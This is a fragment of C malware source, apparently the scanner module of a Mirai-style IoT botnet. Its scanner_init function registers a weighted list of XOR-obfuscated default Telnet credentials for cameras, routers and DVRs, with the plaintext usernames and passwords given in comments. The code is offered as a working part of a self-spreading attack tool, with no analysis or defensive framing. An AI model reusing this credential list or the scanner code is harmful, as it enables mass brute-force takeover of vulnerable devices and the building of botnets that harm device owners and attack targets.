...
void scanner_init(void)
{
    ...
    // Were gona have to cut this down to a combo of 50 or less
    add_auth_entry("\x26\x3B\x3B\x20", "\x2C\x37\x67\x61\x65\x65", 10); // root xc3511
    add_auth_entry("\x26\x3B\x3B\x20", "\x2C\x37\x67\x61\x65\x6C", 10); // root xc3518
    add_auth_entry("\x26\x3B\x3B\x20", "\x2C\x37\x67\x61\x65\x61", 10); // root xc3515
    add_auth_entry("\x22\x27\x20\x35\x26\x37\x35\x39\x66\x64\x65\x61", "\x66\x64\x65\x61\x64\x62\x64\x66", 9); // vstarcam2015 20150602
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x35\x30\x39\x3D\x3A", 9); // admin admin
    add_auth_entry("\x26\x3B\x3B\x20", "\x2E\x20\x31\x6D\x2C\x65\x61", 9); // root zte9x15
    ...
    add_auth_entry("\x26\x3B\x3B\x20", "\x22\x31\x26\x20\x31\x2C\x66\x61\x31\x3F\x20\x3F\x27\x65\x66\x67", 8); // root vertex25ektks123
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x22\x31\x26\x20\x31\x2C\x66\x61\x31\x3F\x20\x3F\x27\x65\x66\x67", 8); // admin vertex25ektks123
    add_auth_entry("\x26\x3B\x3B\x20", "\x0E\x20\x31\x61\x66\x65", 8); // root Zte521
	add_auth_entry("\x30\x31\x32\x35\x21\x38\x20", "", 7);                                      // default
	add_auth_entry("\x30\x31\x32\x35\x21\x38\x20", "\x1B\x2C\x3C\x38\x23\x07\x13\x6C", 7);     // default OxhlwSG8
	add_auth_entry("\x30\x31\x32\x35\x21\x38\x20", "\x07\x66\x32\x13\x25\x1A\x12\x27", 7);     // default S2fGqNFs
	add_auth_entry("\x30\x31\x32\x35\x21\x38\x20", "\x38\x1E\x23\x24\x36\x3B\x62", 7);         // default lJwpbo6
	add_auth_entry("\x30\x31\x32\x35\x21\x38\x20", "\x35\x3A\x20\x27\x38\x25", 7);             // default antslq
    add_auth_entry("\x33\x21\x31\x27\x20", "\x2C\x37\x67\x61\x65\x65", 6); // guest xc3511
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x35\x25\x21\x35\x26\x3D\x3B", 6); // admin aquario
    add_auth_entry("\x27\x21\x24\x24\x3B\x26\x20", "\x27\x21\x24\x24\x3B\x26\x20", 6); // support support
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x24\x35\x27\x27\x23\x3B\x26\x30", 5); // admin password
    add_auth_entry("\x21\x27\x31\x26", "\x21\x27\x31\x26", 5); // user user
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x35\x30\x39\x3D\x3A\x65\x66\x67\x60", 4); // admin admin1234
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x65\x65\x65\x65", 4); // admin 1111
    add_auth_entry("\x33\x21\x31\x27\x20", "\x33\x21\x31\x27\x20", 3); // guest guest
    add_auth_entry("\x33\x21\x31\x27\x20", "\x65\x66\x67\x60\x61", 3); // guest 12345
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x65\x66\x67\x60", 3); // admin 1234
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x3D\x24\x37\x35\x39\x0B\x26\x20\x61\x67\x61\x64", 2); // admin ipcam_rt5350
    add_auth_entry("\x26\x3B\x3B\x20", "\x3D\x24\x37\x35\x39\x0B\x26\x20\x61\x67\x61\x64", 2); // root ipcam_rt5350
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x3C\x3B\x60\x21\x3F\x21\x62\x35\x20", 2); // admin ho4uku6at
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x3F\x3B\x3A\x20\x66\x64\x64\x60", 1); // admin kont2004
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x03\x3D\x3A\x65\x30\x3B\x03\x70", 1); // admin Win1doW$ 
    add_auth_entry("\x26\x3B\x3B\x20", "\x3C\x21\x3A\x20\x61\x63\x61\x6D", 1); // root hunt5759
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x17\x1B\x35\x30\x39\x3D\x3A\x65\x66\x67", 1); // admin COadmin123
    add_auth_entry("\x35\x30\x39\x3D\x3A", "\x0E\x39\x25\x02\x32\x3B\x07\x1D\x04", 1); // admin ZmqVfoSIP
    add_auth_entry("\x26\x3B\x3B\x20", "\x67\x31\x24\x61\x23\x66\x21", 1); // root 3ep5w2u
